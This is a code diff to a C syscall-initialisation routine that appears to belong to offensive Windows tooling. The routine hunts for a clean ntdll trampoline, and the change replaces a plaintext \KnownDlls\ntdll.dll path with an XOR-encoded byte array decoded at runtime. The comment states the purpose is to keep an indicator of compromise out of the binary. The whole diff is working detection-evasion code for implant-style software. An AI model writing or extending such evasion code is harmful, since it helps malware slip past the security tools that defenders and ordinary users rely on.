@@ -150,8 +150,17 @@ BOOL Syscalls_Init(void) {
     PVOID dirtyTrampoline = FindCleanTrampoline((PBYTE)hNtdll);
     if (!dirtyTrampoline) return FALSE;
 
-    /* 3. Prepare parameters for \KnownDlls\ntdll.dll */
-    wchar_t wsKnownDll[] = L"\\KnownDlls\\ntdll.dll";
+    /* 3. Prepare parameters for \KnownDlls\ntdll.dll — built at runtime
+     *    to avoid a plaintext wide-string IOC in .rdata.
+     *    XOR key 0xAA encodes: \ K n o w n D l l s \ n t d l l . d l l */
+    static const BYTE kKnownDllEnc[] = {
+        0xF6,0xE1,0xC4,0xC5,0xDD,0xC4,0xEE,0xC6,
+        0xC6,0xD9,0xF6,0xC4,0xDE,0xCE,0xC6,0xC6,
+        0x84,0xCE,0xC6,0xC6
+    };
+    wchar_t wsKnownDll[21];
+    for (int ii = 0; ii < 20; ii++) wsKnownDll[ii] = (wchar_t)(kKnownDllEnc[ii] ^ 0xAAu);
+    wsKnownDll[20] = L'\0';
     UNICODE_STRING usNtDll;
     usNtDll.Length = (USHORT)(custom_wcslen(wsKnownDll) * sizeof(wchar_t));
     usNtDll.MaximumLength = usNtDll.Length + sizeof(wchar_t);
